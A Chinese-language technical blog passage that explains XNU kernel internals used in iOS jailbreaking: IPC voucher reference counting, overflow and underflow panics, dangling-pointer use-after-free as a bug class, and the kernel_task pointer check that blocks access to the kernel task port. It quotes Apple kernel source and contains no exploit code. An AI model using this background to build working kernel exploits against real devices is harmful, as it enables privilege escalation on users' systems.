<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IPC Voucher</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 凭证是对特定资源管理器属性值的引用计数的不可变（一旦创建）的索引集</span></span><br><span class="line"><span class="comment"> * (which themselves are reference counted).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_voucher</span> &#123;</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_hash;	<span class="comment">/* checksum hash */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_sum;		<span class="comment">/* checksum of values */</span></span><br><span class="line">	<span class="type">os_refcnt_t</span>		iv_refs;	<span class="comment">/* reference count */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_table_size;	<span class="comment">/* size of the voucher table */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_inline_table[IV_ENTRIES_INLINE];</span><br><span class="line">	<span class="type">iv_entry_t</span>		iv_table;	<span class="comment">/* table of voucher attr entries */</span></span><br><span class="line">	<span class="type">ipc_port_t</span>		iv_port;	<span class="comment">/* port representing the voucher */</span></span><br><span class="line">	<span class="type">queue_chain_t</span>		iv_hash_link;	<span class="comment">/* link on hash chain */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IPC凭证代表一组任意属性，这些属性可以通过Mach消息中的发送权限在进程之间传递，与此相关的库是<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/libdispatch/libdispatch-1008.220.2/">libdispatch</a>。除<code>iv_refs</code>和<code>iv_port</code>外，其他的字段与管理凭证对象的全局列表和存储凭证所代表的属性有关。</p>
<p>voucher的iv_refs成员表示引用计数，从iOS12开始，<code>iv_refs</code>是32位的引用计数，值范围为1-0x0fffffff，超出此范围的引用计数将导致错误，这是一种新的防止整数溢出的缓解措施。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;refcnt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OS_REFCNT_MAX_COUNT     ((os_ref_count_t)0x0FFFFFFFUL)</span></span><br></pre></td></tr></table></figure>

<p>如下所示，访问超出此范围的任何值都会触发内核panic。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_underflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: underflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_assert_referenced</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: used unsafely when zero (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_overflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count &gt;= OS_REFCNT_MAX_COUNT)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: overflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iv_port</code>表示此用户空间的凭证。</p>
<blockquote>
<p>通过调用<code>host_create_mach_voucher()</code>陷阱可以创建Mach凭证，返回代表凭证的端口，但是由于凭证是不可变的，当生成的凭证与已有的凭证完全相同时，就会返回现有凭证的引用，而不是创建一个新的凭证。</p>
</blockquote>
<p>voucher的<code>ipc_voucher_reference</code>和<code>ipc_voucher_release</code>函数仅检查voucher是否不为NULL，然后调用<code>iv_reference</code>和<code>iv_release</code>，最后分别调用<code>os_ref_retain</code>和<code>os_ref_release</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	iv_reference(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_release</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL != voucher)</span><br><span class="line">		iv_release(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	os_ref_retain(&amp;iv-&gt;iv_refs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_release</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (os_ref_release(&amp;iv-&gt;iv_refs) == <span class="number">0</span>) &#123;</span><br><span class="line">		iv_dealloc(iv, TRUE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">os_ref_count_t</span> old = atomic_fetch_add_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, memory_order_relaxed);</span><br><span class="line">	os_ref_check_retain(rc, old);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_retain_group(rc-&gt;ref_group);</span><br><span class="line">	ref_log_op(rc-&gt;ref_group, (<span class="type">void</span> *)rc, REFLOG_RETAIN);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span></span><br><span class="line"><span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, memory_order release_order, memory_order dealloc_order)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Care not to use &#x27;rc&#x27; after the decrement because it might be deallocated</span></span><br><span class="line"><span class="comment">	 * under us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">os_refgrp</span> *<span class="title">grp</span> =</span> rc-&gt;ref_group;</span><br><span class="line">	ref_log_op(grp, (<span class="type">void</span> *)rc, REFLOG_RELEASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">os_ref_count_t</span> val = atomic_fetch_sub_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, release_order);</span><br><span class="line">	os_ref_check_underflow(rc, val);</span><br><span class="line">	<span class="keyword">if</span> (__improbable(--val == <span class="number">0</span>)) &#123;</span><br><span class="line">		atomic_load_explicit(&amp;rc-&gt;ref_count, dealloc_order);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">		ref_log_drop(grp, (<span class="type">void</span> *)rc); <span class="comment">/* rc is only used as an identifier */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_release_group(grp, !val);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h</code>中可以看到更多信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * os_ref_retain: acquire a reference (increment reference count by 1) atomically.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release: release a reference (decrement reference count) atomically and</span></span><br><span class="line"><span class="comment"> *		return the new count. Memory is synchronized such that the dealloc block</span></span><br><span class="line"><span class="comment"> *		(i.e. code handling the final release() == 0 call) sees up-to-date memory</span></span><br><span class="line"><span class="comment"> *		with respect to all prior release()s on the same refcnt object. This</span></span><br><span class="line"><span class="comment"> *		memory ordering is sufficient for most use cases.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.</span></span><br><span class="line"><span class="comment"> *		This can be used when the dealloc block is already synchronized with other</span></span><br><span class="line"><span class="comment"> *		accesses to the object (for example, with a lock).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_live: release a reference that is guaranteed not to be the last one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span> <span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc,</span></span><br><span class="line"><span class="params">		memory_order release_order, memory_order dealloc_order)</span> OS_WARN_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release_relaxed</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_relaxed, memory_order_relaxed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_release_live</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(os_ref_release_explicit(rc,</span><br><span class="line">			memory_order_release, memory_order_relaxed) == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: unexpected release of final reference (rc=%p)\n&quot;</span>, rc);</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，可能会出现两种漏洞：</p>
<ul>
<li>以某种方式增加引用计数，从而导致溢出。如前所述，由于存在上限，这实际上是无法利用的。但是仍然可以将引用计数增加到0x0fffffff(7个f)。</li>
<li>将对象的引用计数设置为0，但是仍然有一个指向它的指针。由于引用计数变为0，对象将被释放，因此指向该对象的指针变成了悬空指针。</li>
</ul>
<h3 id="hsp4-Patch"><a href="#hsp4-Patch" class="headerlink" title="hsp4 Patch"></a>hsp4 Patch</h3><p>Apple为防止越狱者获得内核任务而实施的另一项技术是对<code>kernel_task</code>的指针检查。即使获得了内核任务的句柄也无法使用Mach VM调用。检查在<code>ipc_kobject_server()</code>函数的<code>ipc_kmsg_trace_send</code>函数调用处开始，它会调用<code>osfmk/kern/ipc_tt.c</code>中的<code>convert_port_to_task_with_exec_token</code>函数，第31行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	ipc_kobject_server</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Handle a message sent to the kernel.</span></span><br><span class="line"><span class="comment"> *		Generates a reply message.</span></span><br><span class="line"><span class="comment"> *		Version for Untyped IPC.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">ipc_kmsg_t</span></span><br><span class="line"><span class="title function_">ipc_kobject_server</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span>	request,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> __unused option)</span></span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Find the routine to call, and call it</span></span><br><span class="line"><span class="comment">	 * to perform the kernel function</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ipc_kmsg_trace_send(request, option);</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Check if the port is a task port, if its a task port then</span></span><br><span class="line"><span class="comment">		 * snapshot the task exec token before the mig routine call.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">ipc_port_t</span> port = request-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">		<span class="keyword">if</span> (IP_VALID(port) &amp;&amp; ip_kotype(port) == IKOT_TASK) &#123;</span><br><span class="line">			task = convert_port_to_task_with_exec_token(port, &amp;exec_token);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		(*ptr-&gt;routine)(request-&gt;ikm_header, reply-&gt;ikm_header);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Check if the exec token changed during the mig routine */</span></span><br><span class="line">		<span class="keyword">if</span> (task != TASK_NULL) &#123;</span><br><span class="line">			<span class="keyword">if</span> (exec_token != task-&gt;exec_token) &#123;</span><br><span class="line">				exec_token_changed = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">			task_deallocate(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!ipc_kobject_notify(request-&gt;ikm_header, reply-&gt;ikm_header))&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEVELOPMENT || DEBUG</span></span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;ipc_kobject_server: bogus kernel message, id=%d\n&quot;</span>,</span><br><span class="line">			request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* DEVELOPMENT || DEBUG */</span></span></span><br><span class="line">		    _MIG_MSGID_INVALID(request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"></span><br><span class="line">		    ((<span class="type">mig_reply_error_t</span> *) reply-&gt;ikm_header)-&gt;RetCode</span><br><span class="line">			= MIG_BAD_ID;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    kernel_task-&gt;messages_sent++;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_task_with_exec_token</code>函数调用<code>task_conversion_eval</code>函数，第27行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_task_with_exec_token</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a task and return</span></span><br><span class="line"><span class="comment"> *		the exec token stored in the task.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port ref; produces a task ref,</span></span><br><span class="line"><span class="comment"> *		which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">task_t</span></span><br><span class="line"><span class="title function_">convert_port_to_task_with_exec_token</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>		port,</span></span><br><span class="line"><span class="params">	<span class="type">uint32_t</span>		*exec_token)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">task_t</span>		task = TASK_NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		ip_lock(port);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (	ip_active(port)					&amp;&amp;</span><br><span class="line">				ip_kotype(port) == IKOT_TASK		) &#123;</span><br><span class="line">			<span class="type">task_t</span> ct = current_task();</span><br><span class="line">			task = (<span class="type">task_t</span>)port-&gt;ip_kobject;</span><br><span class="line">			assert(task != TASK_NULL);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (task_conversion_eval(ct, task)) &#123;</span><br><span class="line">				ip_unlock(port);</span><br><span class="line">				<span class="keyword">return</span> TASK_NULL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (exec_token) &#123;</span><br><span class="line">				*exec_token = task-&gt;exec_token;</span><br><span class="line">			&#125;</span><br><span class="line">			task_reference_internal(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查就在<code>task_conversion_eval()</code>函数中，caller是想要操作任务端口的任务，victim是被操作的任务。首先检查caller是否为内核，如果是则返回成功。然后检查caller是否与victim相同，因为任务应该能够对其自身执行操作。第三次检查就是关键的地方了，如果想要操作kernel_task而自己不是kernel_task，则检查不会通过。不过这只是对kernel_task指针进行检查实现的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">	 * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">	 * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_EMBEDDED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On embedded platforms, only a platform binary can resolve the task port</span></span><br><span class="line"><span class="comment">	 * of another platform binary.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((victim-&gt;t_flags &amp; TF_PLATFORM) &amp;&amp; !(caller-&gt;t_flags &amp; TF_PLATFORM)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SECURE_KERNEL</span></span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">if</span> (cs_relax_platform_task_ports) &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* SECURE_KERNEL */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

